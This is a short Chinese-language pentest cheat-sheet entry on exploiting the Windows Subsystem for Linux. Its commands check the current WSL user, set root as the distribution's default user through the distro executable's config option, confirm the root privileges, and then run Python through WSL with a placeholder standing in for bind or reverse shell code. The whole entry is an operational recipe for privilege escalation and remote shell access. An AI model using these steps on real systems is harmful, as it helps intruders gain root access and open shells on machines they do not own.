# windows 的 linux 子系统的利用

```bash
wsl whoami
C:\Users\**%username%**\AppData\Local\Microsoft\WindowsApps\<具体的系统，如ubuntu.exe>  config --default-user root
wsl whoami   查看是否切换为root权
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'

```